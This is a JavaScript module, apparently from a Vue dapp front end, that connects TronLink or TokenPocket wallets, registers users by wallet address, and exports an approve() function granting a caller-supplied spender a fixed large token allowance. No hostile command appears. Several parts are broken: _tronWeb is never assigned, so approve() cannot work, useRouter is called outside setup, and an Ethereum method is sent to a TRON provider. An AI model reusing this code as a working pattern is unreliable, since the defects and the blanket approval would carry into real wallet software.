import { useUserStore } from '@/store/user'
import { contractAddress } from './config'
import { showToast } from 'vant'
import { dispatchCustomEvent } from '@/utils'
import { signUp } from '@/api/user'
import { getAcount } from "@/plugin/chain"
import { useRouter } from 'vue-router'



let _tronWeb = null
/**
 * 当前钱包地址
 */
let currentAddress = ''
// export const check = async () => {
//   return typeof window.ethereum !== 'undefined'
// }
export const check = async () => {
  return new Promise((resolve, reject) => {
    // console.log(window, 'window')

    if (window.tronWeb || window.tronLink || window.ethereum) {
      resolve(true)
    } else {
      window.addEventListener(
        'tronWeb#initialized',
        function () {
          resolve(true)
        },
        {
          once: true
        }
      )
      // 等待10ms
      setTimeout(function () {
        resolve(false)
      }, 10)
    }
  })
}

/**
 * 获取默认地址
 */
const getDefaultAddress = (_tronWeb) => {
  return _tronWeb?.defaultAddress?.base58 || _tronWeb?.tronWeb?.defaultAddress?.base58 || ''
}

/**
 * 请求连接钱包
 */


/**
 * 请求连接钱包
 */
export const connect = async () => {
  let result = { code: 200 }
  let isChecked = await check()
  if (isChecked) {
    const tronWeb = window?.tronWeb;
    try {
      if (isModernTronWallet()) {
        // 新版 TronLink: 使用 request 方法
        const accounts = await tronWeb.request({ method: 'tron_requestAccounts' });
        result.data = {
          type: 'TRON',
          address: accounts[0] || tronWeb.defaultAddress.base58
        }
      } else {
        // 旧版 TronLink: 直接获取默认地址
        if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
          result.data = {
            type: 'TRON',
            address: tronWeb.defaultAddress.base58
          }
        } else {
          result.code = 500
          result.msg = 'Please install the TronLink extension and log in to continue.'
        }
      }
    } catch (error) {
      result.code = 500
      result.msg = error.message
    }

  } else {
    result.code = 500
    // result.msg = '请安装 TronLink 扩展插件并登录后继续操作。'
    result.msg = 'Please install the TronLink extension and log in to continue.'
  }
  return result
}
/**
 * 初始化钱包切换监听
 */
export const initSwitchWalletEvent = async () => {
  let checked = await check()

  if (checked) {


    const userStore = useUserStore()

    // alert(window.ethereum.on,'window.ethereum');
    // alert(window.ethereum?.isTokenPocket)

    let accounts
    const accounts1 = await window.tokenpocket.tron.request({ method: 'eth_requestAccounts' })

     

      
    if (accounts1[0]) {
      accounts = accounts1
    } else {
      const accounts2 = await window.ethereum.request({
        method: 'eth_requestAccounts'
      })
      accounts = accounts2
    }





    if (accounts[0].length > 0) {
      currentAddress = accounts[0]

      // userStore.signOut()
      // setTimeout(() => location.reload(), 10)


      // const acountRes = await getAcount()



      // const accounts = await Web3.current.eth.getAccounts();

      //是否有邀请码
      let params = {
        activeCode: null,
        signType: 0,
        address: currentAddress,
        walletType: 'TRON'
      }
      const ret = await signUp(params, { loading: true })
      console.log(ret, '..99999999999');
      const router = useRouter()

      if (ret.code == 200 && ret.data.satoken) {
        // setTimeout(() => location.reload(), 10)
        // 登录成功
        dispatchCustomEvent('event_toastChange', { name: 'login_success' })
        let token = ret.data.satoken
        userStore.setIsSign(true)
        userStore.setToken(token)
        userStore.getUserInfo()
        let time = null
        time = setTimeout(() => location.reload(), 10)
        if (time) {
          clearTimeout(time)

        }
      } else {
        showToast(ret.msg)
      }
    }

    // 监听账户变化
    // window.ethereum.on('accountsChanged', (accounts) => {
    //   if (accounts.length > 0) {
    //     console.log(121211212);

    //     currentAddress = accounts[0]
    //     userStore.signOut()
    //     setTimeout(() => location.reload(), 10)
    //   }
    // });






    window.ethereum.on('chainChanged', async (e) => {
      //监听链网络改变
      console.log('chainChanged', e)
      // alert(e)

      userStore.signOut()
      setTimeout(() => location.reload(), 10)
    })

    window.ethereum.on('disconnect', (code, reason) => {
      // 断开连接
      console.log('disconnect', code, reason)
    })
  }
}

/**
 * 授权
 * @param {string} spenderAddress - 授权地址
 */
export const approve = async (spenderAddress) => {
  try {
    await connect()
    const tronLink = _tronWeb.tronWeb || _tronWeb
    const contract = await tronLink.contract().at(contractAddress)
    return await contract.methods.approve(spenderAddress, '999000000000000000').send()
  } catch (err) {
    console.log(err)
    return Promise.reject(err)
  }
}
